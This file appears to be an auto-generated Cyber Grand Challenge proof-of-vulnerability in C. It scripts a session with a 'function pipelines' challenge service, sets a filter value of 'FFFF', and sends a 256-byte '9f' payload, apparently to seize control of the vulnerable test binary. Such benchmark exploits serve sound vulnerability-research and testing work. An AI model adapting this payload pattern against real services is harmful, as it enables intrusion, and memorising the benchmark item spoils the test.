#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x46\x75\x6e\x63\x74\x69\x6f\x6e\x20\x70\x69\x70\x65\x6c\x69\x6e"
         "\x65\x73\x20\x6d\x61\x64\x65\x20\x65\x61\x73\x79\x21\x0a";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 30);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 1);
      if (read_00001_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00001_00000[] = 
         "\x61\x76\x61\x69\x6c\x61\x62\x6c\x65\x20\x66\x75\x6e\x63\x74\x69"
         "\x6f\x6e\x73\x20\x69\x6e\x63\x6c\x75\x64\x65\x3a\x0a";
      read_00001_ptr += cgc_data_match(read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, match_00001_00000, 29);
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 1);
      if (read_00002_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00002_00000[] = 
         "\x30\x3a\x20\x63\x6f\x6e\x74\x61\x69\x6e\x73\x0a";
      read_00002_ptr += cgc_data_match(read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, match_00002_00000, 12);
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 1);
      if (read_00003_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00003_00000[] = 
         "\x31\x3a\x20\x77\x6f\x72\x64\x2d\x63\x6f\x75\x6e\x74\x0a";
      read_00003_ptr += cgc_data_match(read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, match_00003_00000, 14);
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 1);
      if (read_00004_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00004_00000[] = 
         "\x32\x3a\x20\x64\x6f\x65\x73\x2d\x6e\x6f\x74\x2d\x63\x6f\x6e\x74"
         "\x61\x69\x6e\x0a";
      read_00004_ptr += cgc_data_match(read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, match_00004_00000, 20);
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00005;
      unsigned int read_00005_len;
      unsigned int read_00005_ptr = 0;
      //**** delimited read
      static unsigned char read_00005_delim[] = 
         "\x0a";
      read_00005 = NULL;
      read_00005_len = 0;
      int read_00005_res = cgc_delimited_read(0, &read_00005, &read_00005_len, read_00005_delim, 1);
      if (read_00005_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00005_00000[] = 
         "\x33\x3a\x20\x63\x6f\x6d\x70\x72\x65\x73\x73\x0a";
      read_00005_ptr += cgc_data_match(read_00005 + read_00005_ptr, read_00005_len - read_00005_ptr, match_00005_00000, 12);
      cgc_free(read_00005);
      if (read_00005_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00006;
      unsigned int read_00006_len;
      unsigned int read_00006_ptr = 0;
      //**** delimited read
      static unsigned char read_00006_delim[] = 
         "\x0a";
      read_00006 = NULL;
      read_00006_len = 0;
      int read_00006_res = cgc_delimited_read(0, &read_00006, &read_00006_len, read_00006_delim, 1);
      if (read_00006_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00006_00000[] = 
         "\x34\x3a\x20\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73\x0a";
      read_00006_ptr += cgc_data_match(read_00006 + read_00006_ptr, read_00006_len - read_00006_ptr, match_00006_00000, 14);
      cgc_free(read_00006);
      if (read_00006_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00007;
      unsigned int read_00007_len;
      unsigned int read_00007_ptr = 0;
      //**** delimited read
      static unsigned char read_00007_delim[] = 
         "\x0a";
      read_00007 = NULL;
      read_00007_len = 0;
      int read_00007_res = cgc_delimited_read(0, &read_00007, &read_00007_len, read_00007_delim, 1);
      if (read_00007_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00007_00000[] = 
         "\x57\x68\x69\x63\x68\x20\x66\x75\x6e\x63\x74\x69\x6f\x6e\x20\x64"
         "\x6f\x20\x79\x6f\x75\x20\x77\x69\x73\x68\x20\x74\x6f\x20\x69\x6e"
         "\x63\x6c\x75\x64\x65\x3f\x20\x20\x41\x76\x61\x69\x6c\x61\x62\x6c"
         "\x65\x3a\x20\x5b\x30\x31\x32\x33\x34\x5d\x20\x28\x45\x6e\x74\x65"
         "\x72\x20\x61\x6e\x20\x65\x6d\x70\x74\x79\x20\x6c\x69\x6e\x65\x20"
         "\x74\x6f\x20\x73\x74\x6f\x70\x20\x63\x6f\x6e\x66\x69\x67\x75\x72"
         "\x61\x74\x69\x6f\x6e\x29";
      read_00007_ptr += cgc_data_match(read_00007 + read_00007_ptr, read_00007_len - read_00007_ptr, match_00007_00000, 102);
      cgc_free(read_00007);
      if (read_00007_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x32\x0a";
      static unsigned int write_00000_00000_len = 2;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      unsigned char *read_00008;
      unsigned int read_00008_len;
      unsigned int read_00008_ptr = 0;
      //**** delimited read
      static unsigned char read_00008_delim[] = 
         "\x0a";
      read_00008 = NULL;
      read_00008_len = 0;
      int read_00008_res = cgc_delimited_read(0, &read_00008, &read_00008_len, read_00008_delim, 1);
      if (read_00008_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00008_00000[] = 
         "\x57\x68\x69\x63\x68\x20\x66\x75\x6e\x63\x74\x69\x6f\x6e\x20\x64"
         "\x6f\x20\x79\x6f\x75\x20\x77\x69\x73\x68\x20\x74\x6f\x20\x69\x6e"
         "\x63\x6c\x75\x64\x65\x3f\x20\x20\x41\x76\x61\x69\x6c\x61\x62\x6c"
         "\x65\x3a\x20\x5b\x30\x31\x33\x34\x5d\x20\x28\x45\x6e\x74\x65\x72"
         "\x20\x61\x6e\x20\x65\x6d\x70\x74\x79\x20\x6c\x69\x6e\x65\x20\x74"
         "\x6f\x20\x73\x74\x6f\x70\x20\x63\x6f\x6e\x66\x69\x67\x75\x72\x61"
         "\x74\x69\x6f\x6e\x29";
      read_00008_ptr += cgc_data_match(read_00008 + read_00008_ptr, read_00008_len - read_00008_ptr, match_00008_00000, 101);
      cgc_free(read_00008);
      if (read_00008_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x34\x0a";
      static unsigned int write_00001_00000_len = 2;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00009;
      unsigned int read_00009_len;
      unsigned int read_00009_ptr = 0;
      //**** delimited read
      static unsigned char read_00009_delim[] = 
         "\x0a";
      read_00009 = NULL;
      read_00009_len = 0;
      int read_00009_res = cgc_delimited_read(0, &read_00009, &read_00009_len, read_00009_delim, 1);
      if (read_00009_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00009_00000[] = 
         "\x57\x68\x69\x63\x68\x20\x66\x75\x6e\x63\x74\x69\x6f\x6e\x20\x64"
         "\x6f\x20\x79\x6f\x75\x20\x77\x69\x73\x68\x20\x74\x6f\x20\x69\x6e"
         "\x63\x6c\x75\x64\x65\x3f\x20\x20\x41\x76\x61\x69\x6c\x61\x62\x6c"
         "\x65\x3a\x20\x5b\x30\x31\x33\x5d\x20\x28\x45\x6e\x74\x65\x72\x20"
         "\x61\x6e\x20\x65\x6d\x70\x74\x79\x20\x6c\x69\x6e\x65\x20\x74\x6f"
         "\x20\x73\x74\x6f\x70\x20\x63\x6f\x6e\x66\x69\x67\x75\x72\x61\x74"
         "\x69\x6f\x6e\x29";
      read_00009_ptr += cgc_data_match(read_00009 + read_00009_ptr, read_00009_len - read_00009_ptr, match_00009_00000, 100);
      cgc_free(read_00009);
      if (read_00009_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00002_00000[] = 
         "\x0a";
      static unsigned int write_00002_00000_len = 1;
      unsigned char *write_00002 = NULL;
      unsigned int write_00002_len = 0;
      write_00002 = cgc_append_buf(write_00002, &write_00002_len, write_00002_00000, write_00002_00000_len);
      if (write_00002_len > 0) {
         cgc_transmit_all(1, write_00002, write_00002_len);
      }
      cgc_free(write_00002);
   } while (0);
   do {
      unsigned char *read_00010;
      unsigned int read_00010_len;
      unsigned int read_00010_ptr = 0;
      //**** delimited read
      static unsigned char read_00010_delim[] = 
         "\x0a";
      read_00010 = NULL;
      read_00010_len = 0;
      int read_00010_res = cgc_delimited_read(0, &read_00010, &read_00010_len, read_00010_delim, 1);
      if (read_00010_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00010_00000[] = 
         "\x53\x65\x74\x74\x69\x6e\x67\x20\x63\x6f\x6e\x74\x61\x69\x6e\x73"
         "\x20\x74\x6f\x20\x72\x65\x61\x64\x20\x66\x72\x6f\x6d\x20\x36\x35"
         "\x35\x33\x35\x20\x61\x6e\x64\x20\x77\x72\x69\x74\x65\x20\x74\x6f"
         "\x20\x36\x35\x35\x33\x35\x20\x28\x76\x69\x61\x20\x33\x29";
      read_00010_ptr += cgc_data_match(read_00010 + read_00010_ptr, read_00010_len - read_00010_ptr, match_00010_00000, 62);
      cgc_free(read_00010);
      if (read_00010_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00011;
      unsigned int read_00011_len;
      unsigned int read_00011_ptr = 0;
      //**** delimited read
      static unsigned char read_00011_delim[] = 
         "\x0a";
      read_00011 = NULL;
      read_00011_len = 0;
      int read_00011_res = cgc_delimited_read(0, &read_00011, &read_00011_len, read_00011_delim, 1);
      if (read_00011_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00011_00000[] = 
         "\x53\x65\x74\x74\x69\x6e\x67\x20\x77\x6f\x72\x64\x2d\x63\x6f\x75"
         "\x6e\x74\x20\x74\x6f\x20\x72\x65\x61\x64\x20\x66\x72\x6f\x6d\x20"
         "\x36\x35\x35\x33\x35\x20\x61\x6e\x64\x20\x77\x72\x69\x74\x65\x20"
         "\x74\x6f\x20\x36\x35\x35\x33\x35\x20\x28\x76\x69\x61\x20\x35\x29";
      read_00011_ptr += cgc_data_match(read_00011 + read_00011_ptr, read_00011_len - read_00011_ptr, match_00011_00000, 64);
      cgc_free(read_00011);
      if (read_00011_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00012;
      unsigned int read_00012_len;
      unsigned int read_00012_ptr = 0;
      //**** delimited read
      static unsigned char read_00012_delim[] = 
         "\x0a";
      read_00012 = NULL;
      read_00012_len = 0;
      int read_00012_res = cgc_delimited_read(0, &read_00012, &read_00012_len, read_00012_delim, 1);
      if (read_00012_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00012_00000[] = 
         "\x53\x65\x74\x74\x69\x6e\x67\x20\x63\x6f\x6d\x70\x72\x65\x73\x73"
         "\x20\x74\x6f\x20\x72\x65\x61\x64\x20\x66\x72\x6f\x6d\x20\x36\x35"
         "\x35\x33\x35\x20\x61\x6e\x64\x20\x77\x72\x69\x74\x65\x20\x74\x6f"
         "\x20\x36\x35\x35\x33\x35\x20\x28\x76\x69\x61\x20\x39\x29";
      read_00012_ptr += cgc_data_match(read_00012 + read_00012_ptr, read_00012_len - read_00012_ptr, match_00012_00000, 62);
      cgc_free(read_00012);
      if (read_00012_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00013;
      unsigned int read_00013_len;
      unsigned int read_00013_ptr = 0;
      //**** delimited read
      static unsigned char read_00013_delim[] = 
         "\x0a";
      read_00013 = NULL;
      read_00013_len = 0;
      int read_00013_res = cgc_delimited_read(0, &read_00013, &read_00013_len, read_00013_delim, 1);
      if (read_00013_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00013_00000[] = 
         "\x66\x75\x6e\x63\x74\x69\x6f\x6e\x20\x70\x69\x70\x65\x6c\x69\x6e"
         "\x65\x3a\x20\x64\x6f\x65\x73\x2d\x6e\x6f\x74\x2d\x63\x6f\x6e\x74"
         "\x61\x69\x6e\x20\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73\x0a";
      read_00013_ptr += cgc_data_match(read_00013 + read_00013_ptr, read_00013_len - read_00013_ptr, match_00013_00000, 47);
      cgc_free(read_00013);
      if (read_00013_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00014;
      unsigned int read_00014_len;
      unsigned int read_00014_ptr = 0;
      //**** delimited read
      static unsigned char read_00014_delim[] = 
         "\x0a";
      read_00014 = NULL;
      read_00014_len = 0;
      int read_00014_res = cgc_delimited_read(0, &read_00014, &read_00014_len, read_00014_delim, 1);
      if (read_00014_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00014_00000[] = 
         "\x48\x6f\x77\x20\x64\x6f\x20\x79\x6f\x75\x20\x77\x61\x6e\x74\x20"
         "\x74\x6f\x20\x63\x6f\x6e\x66\x69\x67\x75\x72\x65\x20\x27\x64\x6f"
         "\x65\x73\x2d\x6e\x6f\x74\x2d\x63\x6f\x6e\x74\x61\x69\x6e\x27\x3f"
         "\x0a";
      read_00014_ptr += cgc_data_match(read_00014 + read_00014_ptr, read_00014_len - read_00014_ptr, match_00014_00000, 49);
      cgc_free(read_00014);
      if (read_00014_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00003_00000[] = 
         "\x46\x46\x46\x46\x0a";
      static unsigned int write_00003_00000_len = 5;
      unsigned char *write_00003 = NULL;
      unsigned int write_00003_len = 0;
      write_00003 = cgc_append_buf(write_00003, &write_00003_len, write_00003_00000, write_00003_00000_len);
      if (write_00003_len > 0) {
         cgc_transmit_all(1, write_00003, write_00003_len);
      }
      cgc_free(write_00003);
   } while (0);
   do {
      unsigned char *read_00015;
      unsigned int read_00015_len;
      unsigned int read_00015_ptr = 0;
      //**** delimited read
      static unsigned char read_00015_delim[] = 
         "\x0a";
      read_00015 = NULL;
      read_00015_len = 0;
      int read_00015_res = cgc_delimited_read(0, &read_00015, &read_00015_len, read_00015_delim, 1);
      if (read_00015_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00015_00000[] = 
         "\x53\x65\x74\x74\x69\x6e\x67\x20\x64\x6f\x65\x73\x2d\x6e\x6f\x74"
         "\x2d\x63\x6f\x6e\x74\x61\x69\x6e\x20\x74\x6f\x20\x72\x65\x61\x64"
         "\x20\x66\x72\x6f\x6d\x20\x30\x20\x61\x6e\x64\x20\x77\x72\x69\x74"
         "\x65\x20\x74\x6f\x20\x31\x31\x20\x28\x76\x69\x61\x20\x37\x29";
      read_00015_ptr += cgc_data_match(read_00015 + read_00015_ptr, read_00015_len - read_00015_ptr, match_00015_00000, 63);
      cgc_free(read_00015);
      if (read_00015_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00016;
      unsigned int read_00016_len;
      unsigned int read_00016_ptr = 0;
      //**** delimited read
      static unsigned char read_00016_delim[] = 
         "\x0a";
      read_00016 = NULL;
      read_00016_len = 0;
      int read_00016_res = cgc_delimited_read(0, &read_00016, &read_00016_len, read_00016_delim, 1);
      if (read_00016_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00016_00000[] = 
         "\x53\x65\x74\x74\x69\x6e\x67\x20\x64\x65\x63\x6f\x6d\x70\x72\x65"
         "\x73\x73\x20\x74\x6f\x20\x72\x65\x61\x64\x20\x66\x72\x6f\x6d\x20"
         "\x31\x32\x20\x61\x6e\x64\x20\x77\x72\x69\x74\x65\x20\x74\x6f\x20"
         "\x31\x20\x28\x76\x69\x61\x20\x31\x31\x29";
      read_00016_ptr += cgc_data_match(read_00016 + read_00016_ptr, read_00016_len - read_00016_ptr, match_00016_00000, 58);
      cgc_free(read_00016);
      if (read_00016_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00004_00000[] = 
         "\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66"
         "\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66"
         "\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66"
         "\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66"
         "\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66"
         "\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66"
         "\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66"
         "\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66"
         "\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66"
         "\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66"
         "\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66"
         "\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66"
         "\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66"
         "\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66"
         "\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66"
         "\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66\x39\x66\x39\x0a";
      static unsigned int write_00004_00000_len = 256;
      unsigned char *write_00004 = NULL;
      unsigned int write_00004_len = 0;
      write_00004 = cgc_append_buf(write_00004, &write_00004_len, write_00004_00000, write_00004_00000_len);
      if (write_00004_len > 0) {
         cgc_transmit_all(1, write_00004, write_00004_len);
      }
      cgc_free(write_00004);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00005_00000[] = 
         "\x00\x0a";
      static unsigned int write_00005_00000_len = 2;
      unsigned char *write_00005 = NULL;
      unsigned int write_00005_len = 0;
      write_00005 = cgc_append_buf(write_00005, &write_00005_len, write_00005_00000, write_00005_00000_len);
      if (write_00005_len > 0) {
         cgc_transmit_all(1, write_00005, write_00005_len);
      }
      cgc_free(write_00005);
   } while (0);
   do {
      unsigned char *read_00017;
      unsigned int read_00017_len;
      unsigned int read_00017_ptr = 0;
      //**** length read
      read_00017_len = 1;
      read_00017 = (unsigned char*)cgc_malloc(read_00017_len);
      int read_00017_res = cgc_length_read(0, read_00017, read_00017_len);
      if (read_00017_res) {} //silence unused variable warning
      cgc_free(read_00017);
      if (read_00017_ptr) {}  //silence unused variable warning if any
   } while (0);
}
